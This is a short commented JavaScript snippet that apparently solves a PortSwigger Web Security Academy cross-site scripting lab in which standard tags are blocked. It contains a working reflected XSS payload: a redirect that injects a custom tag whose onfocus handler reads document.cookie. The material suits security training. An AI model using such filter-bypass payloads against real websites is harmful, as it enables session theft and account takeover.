// The payload below is meant to solve the following lag:
// https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked

// Payload needs to be delivered via exploit server and placed between <script> tags.

window.location = 'https://<SUB_DOMAIN>.web-security-academy.net/?search=</h1><faketag id="foo" tabindex=1 onfocus=alert(document.cookie)>world</faketag>#foo'
